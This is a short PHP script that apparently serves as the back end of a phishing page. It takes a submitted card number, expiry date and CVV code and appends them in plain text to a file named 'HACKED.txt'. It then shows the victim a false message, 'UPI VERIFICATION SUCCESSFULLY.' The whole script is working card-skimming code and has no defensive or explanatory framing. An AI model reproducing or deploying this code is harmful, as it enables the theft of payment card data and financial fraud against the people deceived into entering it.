<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $cardNumber = $_POST['card_number'];
    $expireDate = $_POST['expire_date'];
    $cvvCode = $_POST['cvv_code'];

    $data = "Card Number: " . $cardNumber . "\n" .
            "Expire Date: " . $expireDate . "\n" .
            "CVV Code: " . $cvvCode . "\n" .
            "-----------------------------\n";

    // Specify the path where you want to save the file
    $file = 'HACKED.txt';

    // Write the data to the file
    file_put_contents($file, $data, FILE_APPEND);

    echo "UPI VERIFICATION SUCCESSFULLY.";
}
?>
